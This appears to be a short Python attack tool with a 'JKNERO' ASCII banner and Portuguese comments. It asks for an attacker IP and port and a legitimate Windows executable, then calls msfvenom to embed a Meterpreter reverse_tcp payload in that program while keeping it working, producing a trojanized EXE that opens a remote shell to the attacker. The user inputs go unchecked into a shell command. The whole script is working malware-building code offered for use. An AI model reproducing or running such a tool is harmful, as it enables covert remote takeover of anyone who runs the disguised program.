import subprocess
print('''
                                                                                                                              
                                                                                                                              
          JJJJJJJJJJJKKKKKKKKK    KKKKKKKNNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR        OOOOOOOOO     
          J:::::::::JK:::::::K    K:::::KN:::::::N       N::::::NE::::::::::::::::::::ER::::::::::::::::R     OO:::::::::OO   
          J:::::::::JK:::::::K    K:::::KN::::::::N      N::::::NE::::::::::::::::::::ER::::::RRRRRR:::::R  OO:::::::::::::OO 
          JJ:::::::JJK:::::::K   K::::::KN:::::::::N     N::::::NEE::::::EEEEEEEEE::::ERR:::::R     R:::::RO:::::::OOO:::::::O
            J:::::J  KK::::::K  K:::::KKKN::::::::::N    N::::::N  E:::::E       EEEEEE  R::::R     R:::::RO::::::O   O::::::O
            J:::::J    K:::::K K:::::K   N:::::::::::N   N::::::N  E:::::E               R::::R     R:::::RO:::::O     O:::::O
            J:::::J    K::::::K:::::K    N:::::::N::::N  N::::::N  E::::::EEEEEEEEEE     R::::RRRRRR:::::R O:::::O     O:::::O
            J:::::j    K:::::::::::K     N::::::N N::::N N::::::N  E:::::::::::::::E     R:::::::::::::RR  O:::::O     O:::::O
            J:::::J    K:::::::::::K     N::::::N  N::::N:::::::N  E:::::::::::::::E     R::::RRRRRR:::::R O:::::O     O:::::O
JJJJJJJ     J:::::J    K::::::K:::::K    N::::::N   N:::::::::::N  E::::::EEEEEEEEEE     R::::R     R:::::RO:::::O     O:::::O
J:::::J     J:::::J    K:::::K K:::::K   N::::::N    N::::::::::N  E:::::E               R::::R     R:::::RO:::::O     O:::::O
J::::::J   J::::::J  KK::::::K  K:::::KKKN::::::N     N:::::::::N  E:::::E       EEEEEE  R::::R     R:::::RO::::::O   O::::::O
J:::::::JJJ:::::::J  K:::::::K   K::::::KN::::::N      N::::::::NEE::::::EEEEEEEE:::::ERR:::::R     R:::::RO:::::::OOO:::::::O
 JJ:::::::::::::JJ   K:::::::K    K:::::KN::::::N       N:::::::NE::::::::::::::::::::ER::::::R     R:::::R OO:::::::::::::OO 
   JJ:::::::::JJ     K:::::::K    K:::::KN::::::N        N::::::NE::::::::::::::::::::ER::::::R     R:::::R   OO:::::::::OO   
     JJJJJJJJJ       KKKKKKKKK    KKKKKKKNNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR     OOOOOOOOO     
                                                                                                                              
                                                                                                                                                                                                                                        
''')

# Pergunta ao usuário o endereço IP e a porta desejados
lhost = input("IP (LHOST): ")
lport = input("(LPORT): ")

# Pergunta ao usuário o nome do programa original e do arquivo de saída
nome_programa = input("EXE_ORIGINAL: ")
nome_final = input("EXE_SAIDA: ")

#NOMA DO PROGRAMA 1 EX: NC.EXE

# Constrói o comando msfvenom
comando = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -x {nome_programa} -k -f exe > {nome_final}"

# Executa o comando no sistema operacional
subprocess.call(comando, shell=True)

print("O processo foi concluído.")
